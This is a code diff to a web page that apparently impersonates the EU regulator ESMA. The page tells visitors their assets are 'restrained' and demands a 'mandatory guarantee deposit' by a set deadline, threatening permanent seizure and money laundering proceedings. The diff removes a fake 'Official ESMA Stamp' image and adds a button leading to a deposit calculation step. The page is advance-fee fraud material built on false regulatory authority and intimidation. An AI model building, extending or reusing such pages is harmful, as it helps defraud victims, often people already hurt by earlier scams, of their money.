@@ -67,19 +67,6 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .address-box { font-family: 'Courier New', monospace; word-break: break-all; font-size: 16px; font-weight: 700; color: #1e293b; padding-right: 40px; }
 .copy-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--eu-blue); cursor: pointer; font-size: 20px; }
 
-/* STAMP STYLING */
-.official-stamp {
-  position: absolute;
-  right: 15px;
-  bottom: 110px;
-  width: 150px;
-  height: auto;
-  opacity: 0.90;
-  transform: rotate(-10deg);
-  pointer-events: none;
-  z-index: 5;
-}
-
 .modal-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
 .modal-box { background: white; padding: 40px; max-width: 550px; border-radius: 4px; text-align: left; }
 
@@ -100,14 +87,6 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
   .card { border: none; box-shadow: none; padding: 0; }
   .main-content { max-width: 100%; margin: 0; padding: 0; }
   header { border-bottom: 2px solid var(--eu-blue); padding-bottom: 20px; }
-  
-  .official-stamp {
-    display: block !important;
-    position: absolute;
-    right: 20px;
-    bottom: 80px;
-    width: 140px;
-  }
 
   .print-footer {
     display: block !important;
@@ -203,9 +182,6 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
         <tr><td data-i18n="tblJurisdiction">Jurisdiction:</td><td><strong>EEA / Switzerland Hub</strong></td></tr>
       </table>
 
-      <!-- OFFICIAL STAMP -->
-      <img src="https://i.imgur.com/zWuCTYp.png" alt="Official ESMA Stamp" class="official-stamp">
-
       <button class="btn-eu" style="background: var(--success);" onclick="openAgreement()" data-i18n="btnClaim">CLAIM RESTRAINED ASSETS</button>
       <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
     </div>
@@ -239,6 +215,10 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
           Pursuant to European Anti-Money Laundering (AML) Regulations, the beneficiary has until <strong>September 30th, 2026 at 23:59 CET</strong> to settle the mandatory guarantee deposit. Failure to complete verification within this statutory period will result in immediate permanent asset seizure, and the file may be referred to the relevant judicial court for formal Money Laundering proceedings.
         </span>
       </div>
+
+      <button class="btn-eu" onclick="toCalculation()" data-i18n="btnCalc">PROCEED TO DEPOSIT CALCULATION</button>
+      <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
+    </div>
 
     <!-- PHASE 6: CALCULATION -->
     <div id="phase6" class="phase">
